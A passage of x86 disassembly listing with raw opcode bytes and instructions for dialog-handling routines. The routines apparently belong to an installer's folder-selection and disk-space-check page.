  4049a6:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4049a9:	51                   	push   %ecx
  4049aa:	53                   	push   %ebx
  4049ab:	68 4b 04 00 00       	push   $0x44b
  4049b0:	50                   	push   %eax
  4049b1:	ff d6                	call   *%esi
  4049b3:	8b 3d c4 81 40 00    	mov    0x4081c4,%edi
  4049b9:	68 02 7f 00 00       	push   $0x7f02
  4049be:	53                   	push   %ebx
  4049bf:	ff d7                	call   *%edi
  4049c1:	50                   	push   %eax
  4049c2:	ff 15 c8 81 40 00    	call   *0x4081c8
  4049c8:	6a 01                	push   $0x1
  4049ca:	ff 75 fc             	push   -0x4(%ebp)
  4049cd:	ff 75 08             	push   0x8(%ebp)
  4049d0:	e8 9a 00 00 00       	call   0x404a6f
  4049d5:	68 00 7f 00 00       	push   $0x7f00
  4049da:	53                   	push   %ebx
  4049db:	ff d7                	call   *%edi
  4049dd:	50                   	push   %eax
  4049de:	ff 15 c8 81 40 00    	call   *0x4081c8
  4049e4:	8b 7d 14             	mov    0x14(%ebp),%edi
  4049e7:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  4049ee:	75 48                	jne    0x404a38
  4049f0:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  4049f7:	75 3f                	jne    0x404a38
  4049f9:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  4049fd:	75 10                	jne    0x404a0f
  4049ff:	53                   	push   %ebx
  404a00:	6a 01                	push   $0x1
  404a02:	68 11 01 00 00       	push   $0x111
  404a07:	ff 35 68 9a 42 00    	push   0x429a68
  404a0d:	ff d6                	call   *%esi
  404a0f:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404a13:	75 0c                	jne    0x404a21
  404a15:	53                   	push   %ebx
  404a16:	53                   	push   %ebx
  404a17:	6a 10                	push   $0x10
  404a19:	ff 35 68 9a 42 00    	push   0x429a68
  404a1f:	ff d6                	call   *%esi
  404a21:	33 c0                	xor    %eax,%eax
  404a23:	40                   	inc    %eax
  404a24:	eb 1e                	jmp    0x404a44
  404a26:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404a2d:	75 06                	jne    0x404a35
  404a2f:	ff 05 14 0f 42 00    	incl   0x420f14
  404a35:	8b 7d 14             	mov    0x14(%ebp),%edi
  404a38:	57                   	push   %edi
  404a39:	ff 75 10             	push   0x10(%ebp)
  404a3c:	ff 75 0c             	push   0xc(%ebp)
  404a3f:	e8 24 fc ff ff       	call   0x404668
  404a44:	5f                   	pop    %edi
  404a45:	5e                   	pop    %esi
  404a46:	5b                   	pop    %ebx
  404a47:	c9                   	leave
  404a48:	c2 10 00             	ret    $0x10
  404a4b:	83 3d ec 9a 42 00 00 	cmpl   $0x0,0x429aec
  404a52:	a1 10 0f 42 00       	mov    0x420f10,%eax
  404a57:	75 05                	jne    0x404a5e
  404a59:	a1 44 2f 42 00       	mov    0x422f44,%eax
  404a5e:	6a 01                	push   $0x1
  404a60:	6a 01                	push   $0x1
  404a62:	68 f4 00 00 00       	push   $0xf4
  404a67:	50                   	push   %eax
  404a68:	ff 15 58 82 40 00    	call   *0x408258
  404a6e:	c3                   	ret
  404a6f:	55                   	push   %ebp
  404a70:	8b ec                	mov    %esp,%ebp
  404a72:	83 ec 3c             	sub    $0x3c,%esp
  404a75:	8b 45 08             	mov    0x8(%ebp),%eax
  404a78:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  404a7c:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  404a80:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404a83:	8b 45 0c             	mov    0xc(%ebp),%eax
  404a86:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  404a8d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404a90:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404a93:	50                   	push   %eax
  404a94:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404a9b:	c7 45 d0 bc a3 40 00 	movl   $0x40a3bc,-0x30(%ebp)
  404aa2:	e8 01 12 00 00       	call   0x405ca8
  404aa7:	c9                   	leave
  404aa8:	c2 0c 00             	ret    $0xc
  404aab:	55                   	push   %ebp
  404aac:	8b ec                	mov    %esp,%ebp
  404aae:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404ab5:	56                   	push   %esi
  404ab6:	8b 75 14             	mov    0x14(%ebp),%esi
  404ab9:	75 26                	jne    0x404ae1
  404abb:	ff 76 30             	push   0x30(%esi)
  404abe:	6a 1d                	push   $0x1d
  404ac0:	ff 75 08             	push   0x8(%ebp)
  404ac3:	e8 39 fb ff ff       	call   0x404601
  404ac8:	8b 46 3c             	mov    0x3c(%esi),%eax
  404acb:	c1 e0 0b             	shl    $0xb,%eax
  404ace:	05 00 a0 42 00       	add    $0x42a000,%eax
  404ad3:	50                   	push   %eax
  404ad4:	68 e8 03 00 00       	push   $0x3e8
  404ad9:	ff 75 08             	push   0x8(%ebp)
  404adc:	e8 df 11 00 00       	call   0x405cc0
  404ae1:	56                   	push   %esi
  404ae2:	ff 75 10             	push   0x10(%ebp)
  404ae5:	ff 75 0c             	push   0xc(%ebp)
  404ae8:	e8 7b fb ff ff       	call   0x404668
  404aed:	5e                   	pop    %esi
  404aee:	5d                   	pop    %ebp
  404aef:	c2 10 00             	ret    $0x10
  404af2:	55                   	push   %ebp
  404af3:	8b ec                	mov    %esp,%ebp
  404af5:	83 ec 4c             	sub    $0x4c,%esp
  404af8:	a1 20 1f 42 00       	mov    0x421f20,%eax
  404afd:	53                   	push   %ebx
  404afe:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404b01:	56                   	push   %esi
  404b02:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404b05:	8b 40 38             	mov    0x38(%eax),%eax
  404b08:	c1 e3 0b             	shl    $0xb,%ebx
  404b0b:	81 c3 00 a0 42 00    	add    $0x42a000,%ebx
  404b11:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404b18:	57                   	push   %edi
  404b19:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404b1c:	75 11                	jne    0x404b2f
  404b1e:	53                   	push   %ebx
  404b1f:	68 fb 03 00 00       	push   $0x3fb
  404b24:	e8 9d 11 00 00       	call   0x405cc6
  404b29:	53                   	push   %ebx
  404b2a:	e8 01 1e 00 00       	call   0x406930
  404b2f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404b36:	8b 75 08             	mov    0x8(%ebp),%esi
  404b39:	75 6c                	jne    0x404ba7
  404b3b:	68 fb 03 00 00       	push   $0x3fb
  404b40:	56                   	push   %esi
  404b41:	ff 15 3c 82 40 00    	call   *0x40823c
  404b47:	53                   	push   %ebx
  404b48:	8b f8                	mov    %eax,%edi
  404b4a:	e8 79 14 00 00       	call   0x405fc8
  404b4f:	85 c0                	test   %eax,%eax
  404b51:	74 10                	je     0x404b63
  404b53:	53                   	push   %ebx
  404b54:	e8 a3 14 00 00       	call   0x405ffc
  404b59:	85 c0                	test   %eax,%eax
  404b5b:	75 06                	jne    0x404b63
  404b5d:	53                   	push   %ebx
  404b5e:	e8 ee 13 00 00       	call   0x405f51
  404b63:	53                   	push   %ebx
  404b64:	57                   	push   %edi
  404b65:	89 35 38 8a 42 00    	mov    %esi,0x428a38
  404b6b:	ff 15 1c 82 40 00    	call   *0x40821c
  404b71:	8b 45 14             	mov    0x14(%ebp),%eax
  404b74:	ff 70 34             	push   0x34(%eax)
  404b77:	6a 01                	push   $0x1
  404b79:	56                   	push   %esi
  404b7a:	e8 82 fa ff ff       	call   0x404601
  404b7f:	8b 45 14             	mov    0x14(%ebp),%eax
  404b82:	ff 70 30             	push   0x30(%eax)
  404b85:	6a 14                	push   $0x14
  404b87:	56                   	push   %esi
  404b88:	e8 74 fa ff ff       	call   0x404601
  404b8d:	57                   	push   %edi
  404b8e:	e8 a3 fa ff ff       	call   0x404636
  404b93:	6a 09                	push   $0x9
  404b95:	e8 dc 1e 00 00       	call   0x406a76
  404b9a:	85 c0                	test   %eax,%eax
  404b9c:	0f 84 91 02 00 00    	je     0x404e33
  404ba2:	6a 01                	push   $0x1
  404ba4:	57                   	push   %edi
  404ba5:	ff d0                	call   *%eax
  404ba7:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404bae:	0f 85 d1 00 00 00    	jne    0x404c85
  404bb4:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404bb8:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404bbd:	75 18                	jne    0x404bd7
  404bbf:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404bc2:	c1 e9 10             	shr    $0x10,%ecx
  404bc5:	66 81 f9 00 03       	cmp    $0x300,%cx
  404bca:	0f 85 63 02 00 00    	jne    0x404e33
  404bd0:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404bd7:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404bdc:	0f 85 a3 00 00 00    	jne    0x404c85
  404be2:	6a 07                	push   $0x7
  404be4:	33 c0                	xor    %eax,%eax
  404be6:	59                   	pop    %ecx
  404be7:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404bea:	ff 75 f8             	push   -0x8(%ebp)
  404bed:	f3 ab                	rep stos %eax,%es:(%edi)
  404bef:	bf 48 2f 42 00       	mov    $0x422f48,%edi
  404bf4:	68 20 17 42 00       	push   $0x421720
  404bf9:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404bfc:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404bff:	c7 45 c8 48 4e 40 00 	movl   $0x404e48,-0x38(%ebp)
  404c06:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404c09:	e8 b1 1a 00 00       	call   0x4066bf
  404c0e:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404c11:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404c14:	50                   	push   %eax
  404c15:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404c1c:	ff 15 78 81 40 00    	call   *0x408178
  404c22:	85 c0                	test   %eax,%eax
  404c24:	74 58                	je     0x404c7e
  404c26:	50                   	push   %eax
  404c27:	ff 15 a0 82 40 00    	call   *0x4082a0
  404c2d:	53                   	push   %ebx
  404c2e:	e8 1e 13 00 00       	call   0x405f51
  404c33:	a1 70 9a 42 00       	mov    0x429a70,%eax
  404c38:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404c3e:	85 c0                	test   %eax,%eax
  404c40:	74 28                	je     0x404c6a
  404c42:	81 fb 00 48 43 00    	cmp    $0x434800,%ebx
  404c48:	75 20                	jne    0x404c6a
  404c4a:	50                   	push   %eax
  404c4b:	6a 00                	push   $0x0
  404c4d:	e8 6d 1a 00 00       	call   0x4066bf
  404c52:	57                   	push   %edi
  404c53:	bf 00 7a 42 00       	mov    $0x427a00,%edi
  404c58:	57                   	push   %edi
  404c59:	ff 15 00 81 40 00    	call   *0x408100
  404c5f:	85 c0                	test   %eax,%eax
  404c61:	74 07                	je     0x404c6a
  404c63:	57                   	push   %edi
  404c64:	53                   	push   %ebx
  404c65:	e8 34 1a 00 00       	call   0x40669e
  404c6a:	ff 05 38 2f 42 00    	incl   0x422f38
  404c70:	53                   	push   %ebx
  404c71:	68 fb 03 00 00       	push   $0x3fb
  404c76:	56                   	push   %esi
  404c77:	e8 44 10 00 00       	call   0x405cc0
  404c7c:	eb 07                	jmp    0x404c85
  404c7e:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404c85:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404c8c:	74 0d                	je     0x404c9b
  404c8e:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404c95:	0f 85 98 01 00 00    	jne    0x404e33
  404c9b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404c9f:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404ca3:	53                   	push   %ebx
  404ca4:	68 fb 03 00 00       	push   $0x3fb
  404ca9:	e8 18 10 00 00       	call   0x405cc6
  404cae:	53                   	push   %ebx
  404caf:	e8 a5 13 00 00       	call   0x406059
  404cb4:	85 c0                	test   %eax,%eax
  404cb6:	75 07                	jne    0x404cbf
  404cb8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404cbf:	be 18 0f 42 00       	mov    $0x420f18,%esi
  404cc4:	53                   	push   %ebx
  404cc5:	56                   	push   %esi
  404cc6:	e8 b7 19 00 00       	call   0x406682
  404ccb:	6a 01                	push   $0x1
  404ccd:	e8 a4 1d 00 00       	call   0x406a76
  404cd2:	85 c0                	test   %eax,%eax
  404cd4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404cd7:	74 3a                	je     0x404d13
  404cd9:	33 c0                	xor    %eax,%eax
  404cdb:	33 ff                	xor    %edi,%edi
  404cdd:	3b c6                	cmp    %esi,%eax
  404cdf:	74 32                	je     0x404d13
  404ce1:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404ce4:	50                   	push   %eax
  404ce5:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404ce8:	50                   	push   %eax
  404ce9:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404cec:	50                   	push   %eax
  404ced:	56                   	push   %esi
  404cee:	ff 55 f4             	call   *-0xc(%ebp)
  404cf1:	85 c0                	test   %eax,%eax
  404cf3:	75 76                	jne    0x404d6b
  404cf5:	85 ff                	test   %edi,%edi
  404cf7:	74 03                	je     0x404cfc
  404cf9:	66 21 07             	and    %ax,(%edi)
  404cfc:	56                   	push   %esi
  404cfd:	e8 9b 12 00 00       	call   0x405f9d
  404d02:	8b f8                	mov    %eax,%edi
  404d04:	66 83 27 00          	andw   $0x0,(%edi)
  404d08:	4f                   	dec    %edi
  404d09:	4f                   	dec    %edi
  404d0a:	3b fe                	cmp    %esi,%edi
  404d0c:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
  404d11:	75 ce                	jne    0x404ce1
  404d13:	53                   	push   %ebx
  404d14:	56                   	push   %esi
  404d15:	e8 68 19 00 00       	call   0x406682
  404d1a:	56                   	push   %esi
  404d1b:	e8 dc 12 00 00       	call   0x405ffc
  404d20:	33 ff                	xor    %edi,%edi
  404d22:	3b c7                	cmp    %edi,%eax
  404d24:	74 03                	je     0x404d29
  404d26:	66 89 38             	mov    %di,(%eax)
  404d29:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404d2c:	50                   	push   %eax
  404d2d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404d30:	50                   	push   %eax
  404d31:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404d34:	50                   	push   %eax
  404d35:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404d38:	50                   	push   %eax
  404d39:	56                   	push   %esi
  404d3a:	ff 15 90 80 40 00    	call   *0x408090
  404d40:	85 c0                	test   %eax,%eax
  404d42:	74 43                	je     0x404d87
  404d44:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404d47:	be 00 04 00 00       	mov    $0x400,%esi
  404d4c:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404d50:	56                   	push   %esi
  404d51:	ff 75 f4             	push   -0xc(%ebp)
  404d54:	50                   	push   %eax
  404d55:	ff 15 48 81 40 00    	call   *0x408148
  404d5b:	99                   	cltd
  404d5c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404d5f:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404d62:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404d69:	eb 21                	jmp    0x404d8c
  404d6b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404d6e:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404d71:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404d75:	c1 e9 0a             	shr    $0xa,%ecx
  404d78:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404d7b:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404d7e:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404d85:	33 ff                	xor    %edi,%edi
  404d87:	be 00 04 00 00       	mov    $0x400,%esi
  404d8c:	6a 05                	push   $0x5
  404d8e:	e8 fc 01 00 00       	call   0x404f8f
  404d93:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404d96:	74 19                	je     0x404db1
  404d98:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404d9b:	33 c9                	xor    %ecx,%ecx
  404d9d:	3b d1                	cmp    %ecx,%edx
  404d9f:	77 10                	ja     0x404db1
  404da1:	72 07                	jb     0x404daa
  404da3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404da6:	3b c8                	cmp    %eax,%ecx
  404da8:	73 07                	jae    0x404db1
  404daa:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404db1:	8b 0d 3c 8a 42 00    	mov    0x428a3c,%ecx
  404db7:	39 79 10             	cmp    %edi,0x10(%ecx)
  404dba:	74 30                	je     0x404dec
  404dbc:	50                   	push   %eax
  404dbd:	6a fb                	push   $0xfffffffb
  404dbf:	68 ff 03 00 00       	push   $0x3ff
  404dc4:	e8 ae 01 00 00       	call   0x404f77
  404dc9:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404dcc:	74 10                	je     0x404dde
  404dce:	ff 75 d8             	push   -0x28(%ebp)
  404dd1:	ff 75 d4             	push   -0x2c(%ebp)
  404dd4:	6a fc                	push   $0xfffffffc
  404dd6:	56                   	push   %esi
  404dd7:	e8 d2 00 00 00       	call   0x404eae
  404ddc:	eb 0e                	jmp    0x404dec
  404dde:	68 08 0f 42 00       	push   $0x420f08
  404de3:	56                   	push   %esi
  404de4:	ff 75 08             	push   0x8(%ebp)
  404de7:	e8 d4 0e 00 00       	call   0x405cc0
  404dec:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404def:	3b c7                	cmp    %edi,%eax
  404df1:	a3 04 9b 42 00       	mov    %eax,0x429b04
  404df6:	75 0a                	jne    0x404e02
  404df8:	6a 07                	push   $0x7
  404dfa:	e8 0c c6 ff ff       	call   0x40140b
  404dff:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404e02:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404e05:	85 70 14             	test   %esi,0x14(%eax)
  404e08:	74 03                	je     0x404e0d
  404e0a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404e0d:	33 c0                	xor    %eax,%eax
  404e0f:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404e12:	0f 94 c0             	sete   %al
  404e15:	50                   	push   %eax
  404e16:	e8 08 f8 ff ff       	call   0x404623
